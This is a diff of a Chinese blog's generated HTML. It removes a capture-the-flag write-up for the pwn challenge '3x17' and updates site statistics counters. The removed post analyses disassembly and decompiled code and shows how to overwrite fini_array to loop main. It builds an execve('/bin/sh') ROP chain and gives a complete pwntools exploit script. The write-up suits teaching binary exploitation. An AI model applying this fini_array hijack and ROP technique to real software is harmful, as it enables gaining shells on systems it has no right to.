-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: noreturn fuzzy-sp</span><br><span class="line"></span><br><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">mov     r9, rdx</span><br><span class="line">pop     rsi</span><br><span class="line">mov     rdx, rsp</span><br><span class="line">and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">push    rax</span><br><span class="line">push    rsp</span><br><span class="line">mov     r8, offset sub_402960		;r8中存入libc_csu_fini()地址</span><br><span class="line">mov     rcx, offset sub_4028D0		;rcx中存入libc_csu_init()地址</span><br><span class="line">mov     rdi, offset sub_401B6D		;rdi中存入main()地址</span><br><span class="line">db      67h</span><br><span class="line">call    sub_401EB0					;call libc_start_main()函数</span><br><span class="line">hlt</span><br><span class="line">; &#125; // starts at 401A50</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure>
-
-<p> 根据elf文件的标准格式，获得main()等主要函数地址，先对主函数进行分析:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);				<span class="comment">//canary</span></span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)++byte_4B9330;	<span class="comment">//可以char溢出(每过0x100次循环又重新归零)，对解题影响不大</span></span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_446EC0(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    sub_446E20(<span class="number">0</span>, &amp;buf, <span class="number">0x18</span>uLL);</span><br><span class="line">    v4 = (<span class="type">char</span> *)(<span class="type">int</span>)sub_40EE70(&amp;buf);</span><br><span class="line">    sub_446EC0(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    sub_446E20(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v6 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 在主函数的逻辑中，可以看到程序先读取了一个地址(int型)，然后将其作为字符型指针，可以在该地址上写入0x18的数据;</p>
-<p> 因此，可以通过反复调用main函数在合适的地方构造ROP链，实现无限次的任意地址写入从而getshell;</p>
-<p> 根据对elf程序结构的了解，可以知道程序执行完main函数后，会执行_libc_csu_fini函数:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_libc_csu_fini  proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">                push    rbp 					;func prologue</span><br><span class="line">                lea     rax, unk_4B4100			;rax = 0x4B4100</span><br><span class="line">                lea     rbp, off_4B40F0			;rbp = 0x4B40F0</span><br><span class="line">                push    rbx</span><br><span class="line">                sub     rax, rbp 				;即函数数组长度</span><br><span class="line">                sub     rsp, 8</span><br><span class="line">                sar     rax, 3					;0x10 -&gt; 0x02(16 bytes -&gt; 2 个64位地址)</span><br><span class="line">                jz      short loc_402996</span><br><span class="line">                lea     rbx, [rax-1]</span><br><span class="line">                nop     dword ptr [rax+00000000h]</span><br><span class="line">loc_402988:</span><br><span class="line">                call    qword ptr [rbp+rbx*8+0]	;先执行(*(rbp + 8))(), 再执行(*rbp)()</span><br><span class="line">                sub     rbx, 1</span><br><span class="line">                cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">                jnz     short loc_402988</span><br><span class="line">loc_402996:                             </span><br><span class="line">                add     rsp, 8</span><br><span class="line">                pop     rbx</span><br><span class="line">                pop     rbp</span><br><span class="line">                jmp     _term_proc</span><br><span class="line">; &#125; // starts at 402960</span><br><span class="line">_libc_csu_fini  endp</span><br></pre></td></tr></table></figure>
-
-<p> 根据上述分析，发现可以通过修改0x4B40F0处 fini_array[2] 中元素的值，达到无限次循环调用_libc_csu_fini与main函数的目的，进而构造rop链getshell:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构造fini_array，使得程序可以无限次进入main函数</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">fini_array= <span class="number">0x4B40F0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(fini_addr) + p64(main_addr))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构造ROP链</span></span><br><span class="line">prdi = <span class="number">0x401696</span></span><br><span class="line">pdxsi= <span class="number">0x44a309</span></span><br><span class="line">prax = <span class="number">0x41e4af</span></span><br><span class="line">sysc = <span class="number">0x4022b4</span></span><br><span class="line">bufad= <span class="number">0x4B9300</span>		<span class="comment">#到.bss段随便找个位置放&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bufda= <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x10</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(pdxsi))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x18</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x28</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(prdi) + p64(bufad))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x38</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(prax) + p64(<span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x48</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(sysc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(bufad).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(bufda)</span><br></pre></td></tr></table></figure>
-
-<p> 至于rop链构造的位置，通过分析_libc_csu_fini函数以及fini_array地址附近可以发现，_fini_array附近有一片连续的可利用的地址空间且rbp值被设置为0x4B40F0，至于rsp的值可以通过leave;ret;语句来进行调整:<br> 最初rbp指向0f0 - 0x8(libccsufini函数中有push rbx操作)，不能直接leave;ret;<br> 这里有两种选择: 仍然使finiarray[1] 为main函数地址，而后leaveret，或者先ret再leaveret;<br> (leave &#x3D;&#x3D; mov rsp, rbp; pop rbp)<br> (ret     &#x3D;&#x3D; pop rip)</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#调整rbp，rsp，getshell</span></span><br><span class="line">leaveret = <span class="number">0x401c4b</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(leaveret))</span><br></pre></td></tr></table></figure>
-
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p> 直接组合起来即可getshell</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./3x17&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造fini_array，使得程序可以无限次进入main函数</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">fini_array= <span class="number">0x4B40F0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(fini_addr) + p64(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造ROP链</span></span><br><span class="line">prdi = <span class="number">0x401696</span></span><br><span class="line">pdxsi= <span class="number">0x44a309</span></span><br><span class="line">prax = <span class="number">0x41e4af</span></span><br><span class="line">sysc = <span class="number">0x4022b4</span></span><br><span class="line">bufad= <span class="number">0x4B9300</span>		<span class="comment">#到.bss段随便找个位置放&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bufda= <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x10</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(pdxsi))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x18</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x28</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(prdi) + p64(bufad))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x38</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(prax) + p64(<span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array + <span class="number">0x48</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(sysc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(bufad).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(bufda)</span><br><span class="line"><span class="comment">#调整rbp，rsp，getshell</span></span><br><span class="line">leaveret = <span class="number">0x401c4b</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">p.send(p64(leaveret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -790,7 +796,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -803,7 +809,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -848,13 +854,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">57k</span>
+    <span title="站点总字数">62k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">52 分钟</span>
+    <span title="站点阅读时长">57 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
   </div>
